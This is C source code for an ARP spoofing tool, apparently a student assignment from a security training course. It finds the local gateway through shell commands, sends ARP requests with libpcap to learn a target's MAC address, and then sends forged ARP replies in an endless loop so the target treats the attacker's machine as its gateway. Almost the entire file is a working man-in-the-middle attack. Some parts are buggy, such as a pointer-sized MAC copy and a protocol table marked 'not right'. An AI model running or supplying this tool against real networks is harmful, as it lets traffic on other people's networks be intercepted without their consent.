#include <pcap.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#define spoofing_period 1

enum protoc{
    ipv4, ipv6, tcp
};

enum arp__{
    arp_request, arp_reply
};

unsigned int protoc_[] = {0x0800, 0x0000, 0x06}; //not right

const char * protoc_c[] = {"ipv4", "ipv6", "tcp"};

unsigned int offset = 0;

struct ether_addr
{
        unsigned char ether_addr_octet[6];
};

struct ether_header
{
        struct  ether_addr ether_dhost;
        struct  ether_addr ether_shost;
        unsigned short ether_type;
};

struct ip_header
{
        unsigned char ip_header_len:4;
        unsigned char ip_version:4;
        unsigned char ip_tos;
        unsigned short ip_total_length;
        unsigned short ip_id;
        unsigned char ip_frag_offset:5;
        unsigned char ip_more_fragment:1;
        unsigned char ip_dont_fragment:1;
        unsigned char ip_reserved_zero:1;
        unsigned char ip_frag_offset1;
        unsigned char ip_ttl;
        unsigned char ip_protocol;
        unsigned short ip_checksum;
        struct in_addr ip_srcaddr;
        struct in_addr ip_destaddr;
};

struct tcp_header
{
        unsigned short source_port;
        unsigned short dest_port;
        unsigned int sequence;
        unsigned int acknowledge;
        unsigned char ns:1;
        unsigned char reserved_part1:3;
        unsigned char data_offset:4;
        unsigned char fin:1;
        unsigned char syn:1;
        unsigned char rst:1;
        unsigned char psh:1;
        unsigned char ack:1;
        unsigned char urg:1;
        unsigned char ecn:1;
        unsigned char cwr:1;
        unsigned short window;
        unsigned short checksum;
        unsigned short urgent_pointer;
};

int set_ether(struct ether_header *eh, protoc p)
{
    unsigned short ether_type = ntohs(eh->ether_type);
    eh->ether_type = ether_type;
    if(ether_type != protoc_[p])
    {
        printf("not %s protocol", protoc_c[p]);
        return 0;
    }
    return 1;
}

void ether_print(struct ether_header * eh)
{
    printf("-----------------------------------\n");
    printf("ethernet header\n");
    printf("Src MAC Adress [%02x:%02x:%02x:%02x:%02x:%02x]\n", eh->ether_shost.ether_addr_octet[0], eh->ether_shost.ether_addr_octet[1], eh->ether_shost.ether_addr_octet[2],
            eh->ether_shost.ether_addr_octet[3], eh->ether_shost.ether_addr_octet[4], eh->ether_shost.ether_addr_octet[5]);
    printf("Dst MAC Adress [%02x:%02x:%02x:%02x:%02x:%02x]\n\n", eh->ether_dhost.ether_addr_octet[0], eh->ether_dhost.ether_addr_octet[1], eh->ether_dhost.ether_addr_octet[2],
            eh->ether_dhost.ether_addr_octet[3], eh->ether_dhost.ether_addr_octet[4], eh->ether_dhost.ether_addr_octet[5]);
    //printf("protocol : %s", protoc_c[eh->ether_type])
}

int set_ipv4(struct ip_header * ih, protoc p)
{
    if(ih->ip_version != 0x4)
    {
        printf("not ipv4\n");
        return 0;
    }

    if(protoc_[p]!=ih->ip_protocol)
    {
        printf("not %s\n", protoc_c[p]);
        return 0;
    }

    offset = ih->ip_header_len*4;
   // printf("ip header length = %d\n", offset);
    return 1;
}

void ip_print(struct ip_header * ih)
{
    printf("-----------------------------------\n");
    printf("IP header");
    printf("IPv%d\n", ih->ip_version);
    printf("Src IP Adress : %s\n", inet_ntoa(ih->ip_srcaddr));
    printf("Dst IP Adress : %s\n\n", inet_ntoa(ih->ip_destaddr));
}

void tcp_print(struct tcp_header * th)
{
    printf("-----------------------------------\n");
    printf("TCP header\n");
    printf("Src Port : %hu\n",ntohs(th->source_port));
    printf("Dst Port : %hu\n", ntohs(th->dest_port));
}



int arp_reply_extract(const u_char * packet, char* DIP, struct ether_addr * dmac)
{
    //const u_char * packet = packet_;
    //packet = (u_char *)malloc(43*sizeof(u_char));
    //memcpy(packet, packet_, 42);

    struct sockaddr_in sa;

    //if not arp drop
    if(ntohs(*  ((unsigned short *)(packet+12))  ) != 0x0806)
    {
        printf("protocol : %2x\n", ntohs(*(unsigned short *)(packet+12)));
        return 0;
    }
    //if not reply drop
    if(ntohs(*(unsigned short *)(packet+20)) != 0x0002)
    {
        printf("reply? : %2x\n", ntohs(*(unsigned short *)(packet+20)));
        return 0;
    }
    //if not right ip drop
    /*
    if(*(unsigned int *)(packet+28) != *(unsigned int *)DIP)
        return 0;
    */
    inet_pton(AF_INET, DIP, &(sa.sin_addr));
    if((*(unsigned int *)(packet+28)) != (*(unsigned int *)(&(sa.sin_addr))) )
    {
        printf("recieved ip : %x\n", (*(unsigned int *)(packet+28)));
        printf("target ip : %x\n", (*(unsigned int *)(&(sa.sin_addr))));
        return 0;
    }

    memcpy(dmac, packet+22, sizeof(dmac));
    //dmac = (struct ether_addr *)(packet + 22);
    return 1;
}



void arp_r_base_setting(u_char * packet, arp__ rr)
{
    int i;
    for(i = 0; i<6; i++)
        packet[i] = 0xff;
    //set ethernet protocol to arp
    packet[12] = 0x08;
    packet[13] = 0x06;


    /*arp packet*/
    //ethernet
    packet[14] = 0x00;
    packet[15] = 0x01;
    //ipv4
    packet[16] = 0x08;
    packet[17] = 0x00;
    //HW size
    packet[18] = 0x06;
    //Protocol size
    packet[19] = 0x04;
    //arp request/reply
    packet[20] = 0x00;
    if(rr == arp_request)
        packet[21] = 0x01;
    else if (rr == arp_reply)
        packet[21] = 0x02;
    for(i = 32; i<38; i++)
        packet[i] = 0x00;


    //packet 6~11 : SMAC
    //packet 22~27 : SMAC
    //packet 28~31 : SIP
    //packet 39~42 : DIP
}


void arp_request_setting(u_char *packet, char * DIP, char *SMAC, char *SIP)
{
    FILE *fp;

    arp_r_base_setting(packet, arp_request);
    struct sockaddr_in sa;
    int i;

    //get SMAC
    system("ifconfig | grep \"HWaddr\" | awk -F \" \" '{print $5}' | head -n 1 >> SMAC.txt");
    fp = fopen("SMAC.txt", "r");
    fscanf(fp, "%s", SMAC);
    fclose(fp);

    //get SIP
    system("ifconfig | grep \"inet addr\" | head -n 1 | awk -F\" \" '{print $2}' | awk -F \":\" '{print $2}' >> SIP.txt");
    fp = fopen("SIP.txt", "r");
    fscanf(fp, "%s", SIP);
    fclose(fp);

    printf("SMAC : %s\n", SMAC);
    printf("SIP : %s\n", SIP);

    inet_pton(AF_INET, SIP, &(sa.sin_addr));

    //packet 6~11 : SMAC
    //packet 22~27 : SMAC
    //packet 28~31 : SIP
    //packet 38~41 : DIP
    memcpy(packet+28, &(sa.sin_addr), 4*sizeof(char));

    struct ether_addr smac;

    sscanf(SMAC, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &(smac.ether_addr_octet[0]), &(smac.ether_addr_octet[1]),
           &(smac.ether_addr_octet[2]), &(smac.ether_addr_octet[3]),
           &(smac.ether_addr_octet[4]), &(smac.ether_addr_octet[5]));
    memcpy(packet+6, &(smac), sizeof(smac));
    memcpy(packet+22, &(smac), sizeof(smac));

    //DIP
    inet_pton(AF_INET, DIP, &(sa.sin_addr));
    memcpy(packet+38, &(sa.sin_addr), 4*sizeof(char));
    for(i=0; i<42; i++)
        printf("%x ", *(packet + i));
    printf("\n\n");
}


//not yet
void arp_spoof(u_char * packet, char * DIP, struct ether_addr dmac, char *SMAC, char *GIP)
{
    struct sockaddr_in sa;
    int i;

    arp_r_base_setting(packet, arp_reply);

    inet_pton(AF_INET, GIP, &(sa.sin_addr));

    //packet 6~11 : SMAC
    //packet 22~27 : SMAC
    //packet 28~31 : SIP
    //packet 39~42 : DIP
    memcpy(packet+28, &(sa.sin_addr), 4*sizeof(char));

    struct ether_addr smac;

    sscanf(SMAC, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &(smac.ether_addr_octet[0]), &(smac.ether_addr_octet[1]),
           &(smac.ether_addr_octet[2]), &(smac.ether_addr_octet[3]),
           &(smac.ether_addr_octet[4]), &(smac.ether_addr_octet[5]));
    memcpy(packet+6, &(smac), sizeof(smac));
    memcpy(packet+22, &(smac), sizeof(smac));

    //DIP
    inet_pton(AF_INET, DIP, &(sa.sin_addr));
    memcpy(packet+38, &(sa.sin_addr), 4*sizeof(char));


    //setting DMAC
    memcpy(packet, &(dmac), sizeof(dmac));
    memcpy(packet+32, &(dmac), sizeof(dmac));
    for(i=0; i<42; i++)
        printf("%x ", *(packet + i));
    printf("\n\n");
}

void get_gip(char * GIP)
{
    FILE *fp;
    system("route -n | grep UG | awk -F \" \" '{print $2}' > GIP.txt");
    fp = fopen("GIP.txt", "r");
    fscanf(fp, "%s", GIP);
    printf("GIP : %s\n", GIP);
}


int main(int argc, char * argv[]) //int main(int argc, char *argv[])
{
    //pcap_t *arp_r;
    //u_char arp_request_packet[50] = {0, };
    //u_char arp_reply_packet[50] = {0, };
    //u_char arp_spoof_packet[50] = {0, };
    u_char * arp_request_packet;
    u_char * arp_reply_packet;
    u_char * arp_spoof_packet;

    arp_request_packet = (u_char *)calloc(50, sizeof(u_char));
    arp_reply_packet = (u_char *)calloc(50, sizeof(u_char));
    arp_spoof_packet = (u_char *)calloc(50, sizeof(u_char));


    char DIP[20] = {0, };
    struct ether_addr *dmac;
    dmac = (ether_addr*)malloc(sizeof(ether_addr));

    char SMAC[30] = {0,};
    char SIP[20] = {0,};
    //gateway ip
    char GIP[20] = {0,};


   //printf("started\n\n");
   pcap_t *handle;			/* Session handle */
   char *dev;			/* The device to sniff on */
   char errbuf[PCAP_ERRBUF_SIZE];	/* Error string */
   struct bpf_program fp;		/* The compiled filter */
   char filter_exp[] = "";	/* The filter expression */
   bpf_u_int32 mask;		/* Our netmask */
   bpf_u_int32 net;		/* Our IP */
   struct pcap_pkthdr header;	/* The header that pcap gives us */
   const u_char *packet;		/* The actual packet */

   //hyojun
   struct ether_header *eh;
   struct ip_header *ih;
   struct tcp_header * th;

   pcap_if_t *alldevs = NULL;

   int i, got_reply;

   char track[] = "취약점";
   char name[] = "신효준";
   printf("[bob5][%s]pcap_test[%s]\n\n", track, name);

   //gip get
   get_gip(GIP);

   //printf("enter DIP\n");
   //scanf("%s", DIP);
   //fflush(stdin);

   //DIP = argv[1];
   //printf("DIP : %s", argv[1]);
   //DIP = argv[1];
   memcpy(DIP, argv[1], 16*sizeof(char));
   printf("DIP : %s\n", DIP);
   //arp request packet
   arp_request_setting(arp_request_packet, DIP, SMAC, SIP);

   // find all network adapters
       if (pcap_findalldevs(&alldevs, errbuf) == -1) {
           printf("dev find failed\n");
           return -1;
       }
       if (alldevs == NULL) {
           printf("no devs found\n");
           //return -1;
       }
       // print them
       pcap_if_t *d;
       for (d = alldevs, i = 0; d != NULL; d = d->next) {
           printf("%d-th dev: %s ", ++i, d->name);
           if (d->description)
               printf(" (%s)\n", d->description);
           else
               printf(" (No description available)\n");
       }

       int inum;

       printf("enter the interface number: ");
       scanf("%d", &inum);
       for (d = alldevs, i = 0; i < inum - 1; d = d->next, i++); // jump to the i-th dev



   /* Define the device */

   dev = d->name;
   /* Find the properties for the device */
   if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
       fprintf(stderr, "Couldn't get netmask for device %s: %s\n", dev, errbuf);
       net = 0;
       mask = 0;
   }
   /* Open the session in promiscuous mode */
   handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
   if (handle == NULL) {
       fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
       return(2);
   }



   //arp reply -> extract dmac

   //send arp request and get reply => get dmac
   got_reply = 0;
   printf("now ask damc\n");

   while(1)
   {
       sleep(1);
       pcap_sendpacket(handle, arp_request_packet, 42);
       printf("sent arp_reqeust\n");

       packet = pcap_next(handle, &header);
       if(packet==NULL)
           continue;

       if(arp_reply_extract(packet, DIP, dmac))
       {
           got_reply = 1;
           printf("got dmac\n");
           break;
       }


   }

   printf("now start spoof\n");

   //make spoofing packet
   arp_spoof(arp_spoof_packet, DIP, *dmac, SMAC, GIP);

   //spoofing
   while(1)
   {
       pcap_sendpacket(handle, arp_spoof_packet, 42);

       sleep(spoofing_period);
   }

   pcap_close(handle);
   return(0);

}
